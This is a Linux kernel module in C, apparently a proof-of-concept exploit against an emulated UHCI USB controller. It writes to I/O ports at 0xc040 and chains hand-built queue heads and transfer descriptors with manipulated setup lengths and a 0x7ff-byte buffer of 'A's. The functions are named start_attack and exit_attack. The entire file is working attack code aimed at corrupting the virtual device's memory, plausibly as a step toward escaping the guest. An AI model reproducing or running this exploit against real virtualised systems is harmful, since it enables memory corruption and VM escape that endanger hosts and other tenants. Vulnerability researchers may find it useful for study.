#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>

typedef struct TD{
    u32 link;
    u32 ctrl;
    u32 token;
    u32 buffer;
}TD;

typedef struct QH{
    u32 link;
    u32 el_link;
}QH;

void set_fl_addr(u32 addr){
    u16 addr_1 = addr & 0xffff;
    u16 addr_2 = (addr >> 16) & 0xffff;
    outw(addr_2,0xc040+0xa);
    outw(addr_1,0xc040+0x8);
}

void set_frnum(u16 val){
    outb(0x2,0xc040);
    outb(val,0xc040+0x6);
}

void set_port_enable(void){
    outb(4,0xc040+0x10);
}

static int start_attack(void)
{
    void *mem_area;
    void *qh_addr;
    void *td_addr;
    void *qh2_addr;
    void *td2_addr;
    void *td3_addr;
    void *buff_addr;
    TD *td;
    TD *td2;
    TD *td3;
    QH *qh;
    QH *qh2;
    int i;

    mem_area = kmalloc(0x10000,GFP_KERNEL);
    memset(mem_area,0,0x10000);
    printk("[+] the phys addr is 0x%llx\n",virt_to_phys(mem_area));

    qh_addr = mem_area+0x1000;
    td_addr = mem_area+0x1000+0x10;
    qh2_addr = mem_area+0x1000+0x20;
    td2_addr = mem_area+0x1000+0x30;
    td3_addr = mem_area+0x1000+0x40;
    buff_addr = mem_area+0x2000;

    *(u8 *)buff_addr = 0x12;
    *(u8 *)(buff_addr+0x6) = 0x1;//s->setup_len
    *(u8 *)(buff_addr+0x7) = 0x0;//s->setup_len

    *(u8 *)(buff_addr+0x10) = 0x12;
    *(u8 *)(buff_addr+0x16) = 0x1;//s->setup_len
    *(u8 *)(buff_addr+0x17) = 0x0;//s->setup_len

    for (i = 0; i < 0x7ff; i++){
        *(u8 *)(buff_addr+0x20+i) = 0x41;
    }

    *(u32 *)mem_area = (u32)virt_to_phys(qh_addr)+2;//frame list pointer

    qh = qh_addr;
    qh->link = virt_to_phys(qh2_addr)+2;
    qh->el_link = virt_to_phys(td_addr);

    td = td_addr;
    td->link = virt_to_phys(td2_addr)+4;//深度优先遍历
    td->ctrl = 1<<23;
    td->token = 0x2d+(7<<21);// do_token_setup + max_len
    td->buffer = virt_to_phys(buff_addr);

    qh2 = qh2_addr;
    qh2->link = virt_to_phys(qh2_addr)+1;
    qh2->el_link = virt_to_phys(td3_addr);

    td2 = td2_addr;
    td2->link = virt_to_phys(td2_addr)+1;
    td2->ctrl = 1 << 23;
    td2->token = 0x2d+(7<<21);// do_token_out + 0x7ff max_len
    td2->buffer = virt_to_phys(buff_addr+0x10);

    td3 = td3_addr;
    td3->link = virt_to_phys(td3_addr);
    td3->ctrl = 1 << 23;
    td3->token = 0xe1+(0x7fe<<21);
    td3->buffer = virt_to_phys(buff_addr+0x20);

    set_frnum(0);
    set_fl_addr(virt_to_phys(mem_area));

    set_port_enable();
    outb(0x8,0xc040); //trigger frame
    outb(0x1,0xc040);

    // outb(1,0xc040+0x10);

    return 0;
}

static void exit_attack(void)
{
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");